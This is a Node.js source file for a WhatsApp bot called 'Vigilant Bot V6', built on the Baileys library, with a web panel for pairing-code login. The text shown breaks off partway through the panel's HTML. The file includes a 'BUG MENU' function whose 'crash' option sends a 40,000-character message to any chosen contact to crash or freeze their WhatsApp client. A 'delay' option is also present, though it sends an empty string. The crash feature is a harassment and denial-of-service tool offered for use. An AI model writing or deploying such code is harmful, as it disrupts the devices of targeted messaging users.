const express = require('express')
const { default: makeWASocket, useMultiFileAuthState, Browsers, DisconnectReason } = require('@whiskeysockets/baileys')
const fs = require('fs')

const app = express()
app.use(express.urlencoded({ extended: true }))
app.use(express.json())

let sock
let pairingCode = ""
let status = "Waiting for number..."
let isConnected = false

async function startBot(number) {
    const { state, saveCreds } = await useMultiFileAuthState('./session')

    sock = makeWASocket({
        auth: state,
        browser: Browsers.ubuntu("Chrome"),
        printQRInTerminal: false
    })
    
    sock.ev.on('creds.update', saveCreds)
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update
        if(connection === 'open') {
            isConnected = true
            status = "Connected ✅"
            pairingCode = ""
            console.log("Bot Connected!")
        }
        if(connection === 'close') {
            isConnected = false
            const reason = lastDisconnect?.error?.output?.statusCode
            if(reason !== DisconnectReason.loggedOut) {
                status = "Disconnected. Click Restart"
            } else {
                status = "Logged out. Enter number again"
                fs.rmSync('./session', { recursive: true, force: true })
            }
        }
    })
    
    if(!state.creds.registered && number) {
        await new Promise(resolve => setTimeout(resolve, 3000))
        pairingCode = await sock.requestPairingCode(number)
        status = "Code Generated"
        console.log("CODE:", pairingCode)
    }
}

async function disconnectBot() {
    if(sock) await sock.logout()
    sock = null
    isConnected = false
    status = "Disconnected"
    pairingCode = ""
}

// BUG MENU FUNCTION
async function sendBug(jid, type) {
    if(!isConnected) return "Not connected"
    try {
        if(type === "crash") {
            await sock.sendMessage(jid, { text: "x".repeat(40000) })
        }
        if(type === "delay") {
            await sock.sendMessage(jid, { text: "".repeat(1000) })
        }
        return "Bug Sent ✅"
    } catch(e) {
        return "Failed: " + e.message
    }
}

// WEBSITE
app.get('/', (req, res) => {
    res.send(`
    <html>
    <head><title>Vigilant Bot V6</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body{font-family:sans-serif;background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
        .box{background:#1a1a1a;padding:25px;border-radius:12px;text-align:center;width:90%;max-width:400px;border:1px solid #25D366}
        input,select{padding:10px;width:90%;border:none;border-radius:8px;margin:8px 0;background:#333;color:#fff}
        button{padding:10px 15px;margin:5px;border:none;border-radius:8px;cursor:pointer;font-weight:bold}
        .pair{background:#25D366;color:#000}
        .restart{background:#ff9800;color:#000}
        .disconnect{background:#f44336;color:#fff}
        .bug{background:#9c27b0;color:#fff}
        .code{font-size:22px;font-weight:bold;color:#25D366;margin:15px 0;letter-spacing:2px}
        .status{margin:10px 0;font-size:14px;color:#aaa}
        h2{color:#25D366}
    </style>
    </head>
    <body>
        <div class="box">
            <h2>Vigilant Bot V6</h2>
            
            <form method="POST" action="/pair">
                <p><b>Pairing</b></p>
                <input name="number" placeholder="2348xxxxxxxx" required/>
                <button type="submit" class="pair">Get Pairing Code</button>
            </form>

            <div class="code">${pairingCode ? 'Code: ' + pairingCode
